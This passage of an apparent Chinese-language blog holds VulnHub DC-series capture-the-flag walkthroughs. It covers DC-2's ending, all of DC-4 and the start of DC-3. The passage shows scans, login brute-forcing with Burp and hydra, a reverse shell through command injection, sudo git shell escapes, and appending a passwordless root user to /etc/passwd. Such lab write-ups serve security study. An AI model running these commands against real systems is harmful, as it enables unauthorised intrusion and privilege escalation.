8drwxr-x--- 2 tom tom 4096 Mar 21  2019 .drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -&gt; /usr/bin/lesslrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -&gt; /bin/lslrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -&gt; /usr/bin/scplrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -&gt; /usr/bin/vi\n\n发现还没完，虽然逃出来了，cd不受限制了，但是还是好多命令找不到，我们cd到/home/tom/usr/bin目录下发现给我们只开了四个命令，难怪好多命令找不到。\n那多半就是当前用户的$PATH设置的问题了，我们看看。\ntom@DC-2:~/usr/bin$ echo $PATH/home/tom/usr/bintom@DC-2:~/usr/bin$ export PATH=/usr/bin:$PATHtom@DC-2:~/usr/bin$ echo $PATH/usr/bin:/home/tom/usr/bintom@DC-2:~/usr/bin$ catbash: cat: command not found\n\n发现果然是$PATH的问题，我们加个/usr/bin，发现还是不行，算了直接从攻击机的环境变量拷贝一份过来算了。\ntom@DC-2:/home/jerry$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:$PATHtom@DC-2:/home/jerry$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/bin:/home/tom/usr/bintom@DC-2:/home/jerry$ which cat/bin/cattom@DC-2:/home/jerry$ cat flag4.txt Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you&#x27;re on your own now.  :-)Go on - git outta here!!!!\n\n发现命令都可以用了，并且我们也在jerry的目录下找到了flag4。\n虽然傲娇作者表面上说No hints here - you&#39;re on your own now.  :-),实际上还是给了提示:’Go on - git outta here!!!!’告诉我们用git。\n其实这块没细看也没关系，反正sudo -l的时候肯定能发现。\n至于git怎么利用还是在gtfobins上就能找到：\n\ntom@DC-2:/home/jerry$ sudo -l[sudo] password for tom: Sorry, try again.[sudo] password for tom: Sorry, user tom may not run sudo on DC-2.tom@DC-2:/home/jerry$ su jerryPassword: jerry@DC-2:~$ sudo -lMatching Defaults entries for jerry on DC-2:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jerry may run the following commands on DC-2:    (root) NOPASSWD: /usr/bin/gitjerry@DC-2:~$ sudo PAGER=&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27; git -p helpsudo: sorry, you are not allowed to set the following environment variables: PAGERjerry@DC-2:~$ sudo git -p help configGIT-CONFIG(1)                        Git Manual                        GIT-CONFIG(1)NAME       git-config - Get and set repository or global optionsSYNOPSIS       git config [&lt;file-option&gt;] [type] [-z|--null] name [value [value_regex]]       git config [&lt;file-option&gt;] [type] --add name value       git config [&lt;file-option&gt;] [type] --replace-all name value [value_regex]       git config [&lt;file-option&gt;] [type] [-z|--null] --get name [value_regex]       git config [&lt;file-option&gt;] [type] [-z|--null] --get-all name [value_regex]       git config [&lt;file-option&gt;] [type] [-z|--null] --get-regexp name_regex [value_regex]       git config [&lt;file-option&gt;] [type] [-z|--null] --get-urlmatch name URL       git config [&lt;file-option&gt;] --unset name [value_regex]       git config [&lt;file-option&gt;] --unset-all name [value_regex]       git config [&lt;file-option&gt;] --rename-section old_name new_name!/bin/bashroot@DC-2:/home/jerry# whoamirootroot@DC-2:/home/jerry# uname -aLinux DC-2 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linuxroot@DC-2:/home/jerry# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 08:00:27:b4:be:cb brd ff:ff:ff:ff:ff:ff    inet 192.168.56.110/24 brd 192.168.56.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 fe80::a00:27ff:feb4:becb/64 scope link        valid_lft forever preferred_lft foreverroot@DC-2:/home/jerry# cd ~root@DC-2:~# ls -latotal 32drwx------  2 root root 4096 Mar 21  2019 .drwxr-xr-x 21 root root 4096 Mar 10  2019 ..-rw-------  1 root root  207 Mar 21  2019 .bash_history-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt-rw-------  1 root root   46 Mar 21  2019 .lesshst-rw-------  1 root root  232 Mar 21  2019 .mysql_history-rw-r--r--  1 root root  140 Nov 19  2007 .profileroot@DC-2:~# cat final-flag.txt  __    __     _ _       _                    _ / / /\\ \\ \\___| | |   __| | ___  _ __   ___  / \\\\ \\/  \\/ / _ \\ | |  / _` |/ _ \\| &#x27;_ \\ / _ \\/  / \\  /\\  /  __/ | | | (_| | (_) | | | |  __/\\_/   \\/  \\/ \\___|_|_|  \\__,_|\\___/|_| |_|\\___\\/   Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it&#x27;s all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.\n\n成功拿下。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[vulnhub]  DC:4","url":"/2023/06/01/DC-4/","content":"\n\n\n简介DC-4前面信息收集和web渗透部分就是直接简单粗暴解决，提权部分主要看提权时的信息收集能力。总体来说是台很简单的靶机。\n信息收集┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nmap -sn 192.168.56.0/24       [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:30 CSTNmap scan report for 192.168.56.1Host is up (0.00032s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00030s latency).MAC Address: 08:00:27:B1:3D:71 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.112Host is up (0.00029s latency).MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 7.29 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.112Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:31 CSTNmap scan report for 192.168.56.112Host is up (0.0078s latency).Not shown: 51829 filtered tcp ports (no-response), 13704 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 36.26 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.112Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:32 CSTNmap scan report for 192.168.56.112Host is up (0.0014s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 8d6057066c27e02f762ce642c001ba25 (RSA)|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)|_  256 fd39478a5e58339973739e227f904f4b (ED25519)80/tcp open  http    nginx 1.15.10|_http-title: System Tools|_http-server-header: nginx/1.15.10MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nmap --script=vuln 192.168.56.112         Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:34 CSTNmap scan report for 192.168.56.112Host is up (0.014s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.112|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.112:80/|     Form id: |     Form action: login.php|     |     Path: http://192.168.56.112:80/login.php|     Form id: |_    Form action: login.php|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 78.64 seconds\n\nnmap一套扫完下来并没给我们带来太多可用信息。主要告诉我们开了22和80端口，以及80端口上跑着nginx 1.15.10服务。\n秉持着不遗漏的原则，又用nikto扫一下看看错没错过什么可用漏洞。\n┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nikto -h http://192.168.56.112- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.112+ Target Hostname:    192.168.56.112+ Target Port:        80+ Start Time:         2023-06-01 14:34:35 (GMT8)---------------------------------------------------------------------------+ Server: nginx/1.15.10+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time:           2023-06-01 14:35:01 (GMT8) (26 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n遗憾的是并没有，更遗憾的是nginx 1.15也没找到什么可用的漏洞。\nweb渗透查看网站那就直接看看网页吧\n\n发现网页除了个登录框就啥也没有了。\n目录扫描一下看看有没有别的页面。\n┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo dirb http://192.168.56.112    [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Thu Jun  1 14:31:42 2023URL_BASE: http://192.168.56.112/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.112/ ----==&gt; DIRECTORY: http://192.168.56.112/css/                                                   ==&gt; DIRECTORY: http://192.168.56.112/images/                                                + http://192.168.56.112/index.php (CODE:200|SIZE:506)                                                                                                                                   ---- Entering directory: http://192.168.56.112/css/ ----                                                                                            ---- Entering directory: http://192.168.56.112/images/ ----                                                                                            -----------------END_TIME: Thu Jun  1 14:31:56 2023DOWNLOADED: 13836 - FOUND: 1\n\n发现并没有。\n再用别的字典以及扩展名找一下:sudo dirsearch -u 192.168.56.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt,zip\n然而实际上还是发现不了解别的目录。事已至此，只能爆破了。\n爆破用一下burpsuite。（不用hydra主要是因为这个页面输入错误凭证不会给任何错误提示而是直接跳转，不知道怎么告诉hydra那些是错误的密码）\n\n简简单单暴个破，字典我用的seclists里面passwords中的500-worst-passwords。\n\n爆破成功，密码是happy。至于为什么下面一些密码全报200，是因为该系统页面登录成功后会给用户设置成功login的session。而之后及时输入错误的密码也将session覆盖成登录失败的session（其实是写了但是被注释掉了），具体代码可以get shell后查看login.php。\nRCE成功登录进后台\n\n点进command看看，发现可以选择命令执行。\n\n那我们来兴趣了，如果这里能执行我们的命令多好。\n抓个包可以发现是用post传参，然后后台执行命令并传回回显。\n那我们直接向里面写入我们的反弹shell。（URL编码部分其实就是熟悉的伪设备反弹shell，之所以用URL编码是因为防止&amp;被识别为间隔参数的符号了）\n\n发现可以成功拿到反弹shell。\n┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ sudo nc -lvp 443                      listening on [any] 443 ...192.168.56.112: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.144] from (UNKNOWN) [192.168.56.112] 37492bash: cannot set terminal process group (331): Inappropriate ioctl for devicebash: no job control in this shellwww-data@dc-4:/usr/share/nginx/html$ \n\n\n\n提权www-data我们拿到的shell的当前用户是www-data，基本没什么权限。sudo -l不知道密码，看看定时任务也没什么新鲜的，suid位倒是有个有趣的文件。\nwww-data@dc-4:~$ find / -type f -perm -u=s 2&gt;/dev/nullfind / -type f -perm -u=s 2&gt;/dev/null/usr/bin/gpasswd/usr/bin/chfn/usr/bin/sudo/usr/bin/chsh/usr/bin/newgrp/usr/bin/passwd/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/sbin/exim4/bin/mount/bin/umount/bin/su/bin/ping/home/jim/test.sh\n\n那我们就去看看，可惜只是jim的s位，没啥用。但是在jim的home目录我们发现了backup目录，进去一看就发现了jim的旧密码备份。\nwww-data@dc-4:/home/jim$ cd backcd backups/www-data@dc-4:/home/jim/backups$ ls -la                ls -latotal 12drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bakwww-data@dc-4:/home/jim/backups$ cat old-cat old-passwords.bak 00000012345iloveyou1q2w3e4r5t1234123456aqwertyuiopmonkey123321dragon......\n\n这里面有没有可能有jim的密码呢，但是200多条显然不可能一个个试，22端口开着，我们就用hydra爆破一下。\n┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ hydra -l jim -P old-pass ssh://192.168.56.112  Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 15:16:30[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task[DATA] attacking ssh://192.168.56.112:22/[STATUS] 146.00 tries/min, 146 tries in 00:01h, 110 to do in 00:01h, 13 active[STATUS] 105.50 tries/min, 211 tries in 00:02h, 45 to do in 00:01h, 13 active[22][ssh] host: 192.168.56.112   login: jim   password: jibril041 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 3 final worker threads did not complete until end.[ERROR] 3 targets did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 15:18:50\n\n发现了jim的登录凭证：jim:jibril04\njim┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]└─$ ssh jim@192.168.56.112          The authenticity of host &#x27;192.168.56.112 (192.168.56.112)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.56.112&#x27; (ED25519) to the list of known hosts.jim@192.168.56.112&#x27;s password: Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have mail.Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100jim@dc-4:~$ \n\n成功登录。\nmotd还提示我们有邮件，那我们先看看。\njim@dc-4:~$ lsbackups  mbox  test.shjim@dc-4:~$ cat mboxFrom root@dc-4 Sat Apr 06 20:20:04 2019Return-path: &lt;root@dc-4&gt;Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000Received: from root by dc-4 with local (Exim 4.89)        (envelope-from &lt;root@dc-4&gt;)        id 1hCiQe-0000gc-EC        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000To: jim@dc-4Subject: TestMIME-Version: 1.0Content-Type: text/plain; charset=&quot;UTF-8&quot;Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;From: root &lt;root@dc-4&gt;Date: Sat, 06 Apr 2019 20:20:04 +1000Status: ROThis is a test.\n\n此处并没有啥信息。linux下应该还有一个邮件存储位置的来着，但是哪忘了，不过我们可以自己查一下。grep反选掉proc下的文件，主要一般proc下的信息都没啥用。\njim@dc-4:~$ find / -user jim 2&gt;/dev/null | grep -v proc/run/user/1002/run/user/1002/gnupg/run/user/1002/gnupg/S.gpg-agent/run/user/1002/gnupg/S.gpg-agent.extra/run/user/1002/gnupg/S.gpg-agent.ssh/run/user/1002/gnupg/S.gpg-agent.browser/run/user/1002/systemd/run/user/1002/systemd/private/run/user/1002/systemd/notify/run/user/1002/systemd/transient/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/tasks/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.clone_children/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/tasks/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/notify_on_release/dev/pts/0/var/mail/jim/home/jim/home/jim/mbox/home/jim/test.sh/home/jim/new.sh/home/jim/.profile/home/jim/backups/home/jim/backups/old-passwords.bak/home/jim/.bashrc/home/jim/.bash_logout/home/jim/.bash_history\n\n发现是在/var/mail/jim\n看一看\njim@dc-4:~$ cat /var/mail/jimFrom charles@dc-4 Sat Apr 06 21:15:46 2019Return-path: &lt;charles@dc-4&gt;Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000Received: from charles by dc-4 with local (Exim 4.89)        (envelope-from &lt;charles@dc-4&gt;)        id 1hCjIX-0000kO-Qt        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000To: jim@dc-4Subject: HolidaysMIME-Version: 1.0Content-Type: text/plain; charset=&quot;UTF-8&quot;Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;From: Charles &lt;charles@dc-4&gt;Date: Sat, 06 Apr 2019 21:15:45 +1000Status: OHi Jim,I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.Password is:  ^xHhA&amp;hvim0ySee ya,Charles\n\n发现了charles的密码^xHhA&amp;hvim0y\ncharles直接切到charles\njim@dc-4:~$ su charlesPassword: charles@dc-4:/home/jim$ sudo -lMatching Defaults entries for charles on dc-4:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser charles may run the following commands on dc-4:    (root) NOPASSWD: /usr/bin/teehee\n\n发现其可以无密码执行teehee，teehee是一个linux下的文本编辑器，我们可以在网上查到利用其提权的方法。即利用其向/etc/passwd写入一个gid和uid都为0的无密码用户。在linux里，如果一个用户在passwd和shadow里都没有密码，那我们就可以无密码登录这个用户。这样，我们只要su到这个用户就能获得root权限。\ncharles@dc-4:/home/jim$ echo &quot;test::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwdtest::0:0:::/bin/bashcharles@dc-4:/home/jim$ su testroot@dc-4:/home/jim# whoamirootroot@dc-4:/home/jim# iduid=0(root) gid=0(root) groups=0(root)\n\n成功提权，检查一下passwd发现确实是如此实现的。\nroot@dc-4:/home/jim# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsemessagebus:x:105:109::/var/run/dbus:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinnginx:x:107:111:nginx user,,,:/nonexistent:/bin/falsecharles:x:1001:1001:Charles,,,:/home/charles:/bin/bashjim:x:1002:1002:Jim,,,:/home/jim:/bin/bashsam:x:1003:1003:Sam,,,:/home/sam:/bin/bashDebian-exim:x:108:112::/var/spool/exim4:/bin/falsetest::0:0:::/bin/bash\n\nrootroot@dc-4:/home/jim# cd /rootroot@dc-4:/root# ls -latotal 28drwx------  3 root root 4096 Apr  7  2019 .drwxr-xr-x 21 root root 4096 Apr  5  2019 ..-rw-------  1 root root   16 Apr  7  2019 .bash_history-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc-rw-r--r--  1 root root  976 Apr  6  2019 flag.txtdrwxr-xr-x  2 root root 4096 Apr  6  2019 .nano-rw-r--r--  1 root root  148 Aug 18  2015 .profileroot@dc-4:/root# cat flag.txt888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.\n\n拿到flag。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[vulnhub]  DC:3","url":"/2023/05/31/DC-3/","content":"\n\n\nDC:3简介Vulnhub DC 系列第三台机子。主要是对Joomla CMS的渗透。\n信息收集┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo nmap -sn 192.168.56.0/24      [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:52 CSTNmap scan report for 192.168.56.1Host is up (0.00021s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00020s latency).MAC Address: 08:00:27:B1:3D:71 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.111Host is up (0.00085s latency).MAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 15.94 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.111Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:52 CSTNmap scan report for 192.168.56.111Host is up (0.00037s latency).Not shown: 65534 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 5.91 seconds                                                                                                       ┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.111Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:53 CSTNmap scan report for 192.168.56.111Host is up (0.0011s latency).PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: Home|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-generator: Joomla! - Open Source Content ManagementMAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo nmap --script=vuln 192.168.56.111      Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:55 CSTNmap scan report for 192.168.56.111Host is up (0.00038s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  http|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/| http-vuln-cve2017-8917: |   VULNERABLE:|   Joomla! 3.7.0 &#x27;com_fields&#x27; SQL Injection Vulnerability|     State: VULNERABLE|     IDs:  CVE:CVE-2017-8917|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers|       to execute aribitrary SQL commands via unspecified vectors.|       |     Disclosure date: 2017-05-17|     Extra information:|       User: root@localhost|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-enum: |   /administrator/: Possible admin folder|   /administrator/index.php: Possible admin folder|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0|   /language/en-GB/en-GB.xml: Joomla version 3.7.0|   /htaccess.txt: Joomla!|   /README.txt: Interesting, a readme.|   /bin/: Potentially interesting folder|   /cache/: Potentially interesting folder|   /images/: Potentially interesting folder|   /includes/: Potentially interesting folder|   /libraries/: Potentially interesting folder|   /modules/: Potentially interesting folder|   /templates/: Potentially interesting folder|_  /tmp/: Potentially interesting folder| http-internal-ip-disclosure: |_  Internal IP Leaked: 127.0.1.1| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.111:80/|     Form id: login-form|     Form action: /index.php|     |     Path: http://192.168.56.111:80/index.php/component/users/?view=reset&amp;amp;Itemid=101|     Form id: user-registration|     Form action: /index.php/component/users/?task=reset.request&amp;Itemid=101|     |     Path: http://192.168.56.111:80/index.php/component/users/?view=reset&amp;amp;Itemid=101|     Form id: login-form|     Form action: /index.php/component/users/?Itemid=101|     |     Path: http://192.168.56.111:80/index.php/2-uncategorised/1-welcome|     Form id: login-form|     Form action: /index.php|     |     Path: http://192.168.56.111:80/index.php/component/users/?view=remind&amp;amp;Itemid=101|     Form id: user-registration|     Form action: /index.php/component/users/?task=remind.remind&amp;Itemid=101|     |     Path: http://192.168.56.111:80/index.php/component/users/?view=remind&amp;amp;Itemid=101|     Form id: login-form|     Form action: /index.php/component/users/?Itemid=101|     |     Path: http://192.168.56.111:80/index.php|     Form id: login-form|_    Form action: /index.phpMAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 321.70 seconds\n\n发现只开了80端口，那说明是要一条路走到黑了。\n不过好处是扫描扫出来了存在Joomla! 3.7.0 &#39;com_fields&#39; SQL Injection Vulnerability这个漏洞。说明80端口跑的是基于Joomla搭建的网站且有SQL注入漏洞。\nweb渗透那就直接下手。\nSQLMAP按照exp里的利用方式先用sqlmap试试。\n┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]└─$ sudo sqlmap -u 